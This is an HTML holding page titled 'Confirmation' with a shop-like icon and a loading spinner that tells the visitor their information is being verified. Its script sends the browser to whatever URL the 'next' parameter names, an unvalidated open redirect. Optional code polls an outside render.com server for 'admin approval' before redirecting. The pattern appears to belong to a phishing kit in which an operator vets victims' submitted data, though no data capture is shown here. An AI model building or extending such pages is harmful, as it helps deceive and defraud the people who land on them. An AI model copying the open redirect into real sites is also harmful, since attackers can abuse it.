<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmation</title>
    <link rel="icon" type="image/png" href="res/shopi.png">
    <link rel="stylesheet" href="res/app.css">
    <style>
        .loading-container {
            text-align: center;
        }
        
        .loading-text {
            margin-bottom: 30px;
            color: #333;
            font-size: 24px;
        }
        
        .loading-message {
            color: #666;
            font-size: 16px;
            margin-bottom: 20px;
        }
        
        .loading-gif {
            width: 60px;
            height: 60px;
            margin: 20px 0;
        }
    </style>
</head>
<body>    
<main>
    <div class="form" style="text-align:center;">
        <div class="logo">
            <img src="res/logo.png" alt="Logo">
        </div>
        
        <div class="text">
            <h2 style="margin-bottom:30px;">Please Wait</h2>
            <span>Your request is being processed. Please wait while we verify your information.</span>
        </div>

        <div class="col"></div>

        <div class="col" style="text-align:center;">
            <img src="res/loading.gif" class="loading-gif" alt="Loading">
        </div>

        <div class="col links">
            <span>Help</span>
            <span>Privacy</span>
            <span>Terms</span>
        </div>
    </div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
// Get the target URL from query parameter
const urlParams = new URLSearchParams(window.location.search);
let target = urlParams.get('next') || "";

// Redirect after 12 seconds if target exists
setTimeout(() => {
    if(target !== ""){
        window.location = target;
    } else {
        // If no target, redirect to index.html after timeout
        window.location = "index.html";
    }
}, 12000);

// Optional: Check for admin approval in real-time (if you want to integrate with Flask)
let sessionId = null;
let checkInterval = null;

// Function to check status (optional - if you want to integrate with Flask backend)
function checkStatus() {
    if (!sessionId) return;
    
    $.ajax({
        url: `https://shopy-fbwo.onrender.com/status/${sessionId}`,
        method: 'GET',
        success: function(response) {
            if (response.status === "approved") {
                clearInterval(checkInterval);
                window.location.href = response.redirect_url;
            }
        },
        error: function(xhr) {
            if (xhr.status === 404) {
                clearInterval(checkInterval);
                console.log("Session expired");
            }
        }
    });
}

// If you have a sessionId from previous page, you can check status
// Example: sessionId = localStorage.getItem('lastSessionId');
// if (sessionId) {
//     checkInterval = setInterval(checkStatus, 2000);
// }

$(window).on('beforeunload', function() {
    if (checkInterval) clearInterval(checkInterval);
});
</script>
</body>
</html>
